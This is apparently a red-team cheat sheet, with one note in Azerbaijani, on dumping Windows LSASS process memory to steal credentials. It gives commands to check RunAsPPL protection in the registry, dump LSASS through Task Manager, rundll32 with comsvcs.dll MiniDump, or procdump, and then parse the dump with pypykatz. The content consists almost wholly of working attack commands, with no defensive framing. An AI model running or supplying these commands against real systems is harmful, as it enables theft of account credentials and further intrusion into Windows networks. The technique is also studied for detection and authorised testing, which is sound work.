# LSASS Dump

```bash

# Check RunAsPPL
LSASS Dump Technique:
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -ErrorAction SilentlyContinue
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPLBoot -ErrorAction SilentlyContinue

Dəyər Yoxdursa RunAsPPL = 0

# Dump Technique 1
Task Manager --> Local Security Authority Process --> Create dump file ( %temp% )

# Dump Technique 2
CMD: tasklist /svc
PowerShell: Get-Process lsass

rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
procdump.exe -ma lsass.exe lsass.dmp

pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
